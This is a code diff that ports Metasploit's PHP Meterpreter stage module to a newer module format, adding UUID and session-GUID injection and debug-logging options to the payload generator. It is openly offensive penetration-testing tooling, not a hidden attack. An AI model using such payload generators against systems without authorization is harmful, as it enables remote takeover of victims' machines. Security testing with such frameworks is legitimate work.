@@ -1,43 +1,48 @@
 ##
-# $Id$
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
-##
+require 'securerandom'
 
-require 'msf/core'
-require 'msf/core/handler/reverse_tcp'
-require 'msf/base/sessions/meterpreter_php'
-require 'msf/base/sessions/meterpreter_options'
+module MetasploitModule
+  include Msf::Sessions::MeterpreterOptions::Php
 
+  def initialize(info = {})
+    super(
+      merge_info(
+        info,
+        'Name' => 'PHP Meterpreter',
+        'Description' => 'Run a meterpreter server in PHP',
+        'Author' => ['egypt'],
+        'Platform' => 'php',
+        'Arch' => ARCH_PHP,
+        'License' => MSF_LICENSE,
+        'Session' => Msf::Sessions::Meterpreter_Php_Php
+      )
+    )
+  end
 
-module Metasploit3
-	include Msf::Sessions::MeterpreterOptions
+  def generate_stage(opts = {})
+    met = MetasploitPayloads.read('meterpreter', 'meterpreter.php')
 
-	def initialize(info = {})
-		super(update_info(info,
-			'Name'          => 'PHP Meterpreter',
-			'Version'       => '$Revision$',
-			'Description'   => 'Run a meterpreter server in PHP',
-			'Author'        => ['egypt'],
-			'Platform'      => 'php',
-			'Arch'          => ARCH_PHP,
-			'License'       => MSF_LICENSE,
-			'Session'       => Msf::Sessions::Meterpreter_Php_Php))
-	end
+    uuid = opts[:uuid] || generate_payload_uuid
+    bytes = uuid.to_raw.chars.map { |c| '\x%.2x' % c.ord }.join('')
+    met = met.sub('"PAYLOAD_UUID", ""', "\"PAYLOAD_UUID\", \"#{bytes}\"")
 
-	def generate_stage
-		file = File.join(Msf::Config.data_directory, "meterpreter", "meterpreter.php")
+    # Staged payloads need to have a new session GUID
+    session_guid = [SecureRandom.uuid.gsub(/-/, '')].pack('H*').chars.map { |c| '\x%.2x' % c.ord }.join('')
+    met = met.sub(%q{"SESSION_GUID", ""}, %("SESSION_GUID", "#{session_guid}"))
 
-		met = File.open(file, "rb") {|f|
-			f.read(f.stat.size)
-		}
-		#met.gsub!(/#.*?$/, '')
-		#met = Rex::Text.compress(met)
-		met
-	end
+    if datastore['MeterpreterDebugBuild']
+      met.sub!(%q{define("MY_DEBUGGING", false);}, %|define("MY_DEBUGGING", true);|)
+
+      logging_options = Msf::OptMeterpreterDebugLogging.parse_logging_options(datastore['MeterpreterDebugLogging'])
+      met.sub!(%q{define("MY_DEBUGGING_LOG_FILE_PATH", false);}, %|define("MY_DEBUGGING_LOG_FILE_PATH", "#{logging_options[:rpath]}");|) if logging_options[:rpath]
+    end
+
+    met.gsub!(/#.*?$/, '')
+    # met = Rex::Text.compress(met)
+    met
+  end
 end
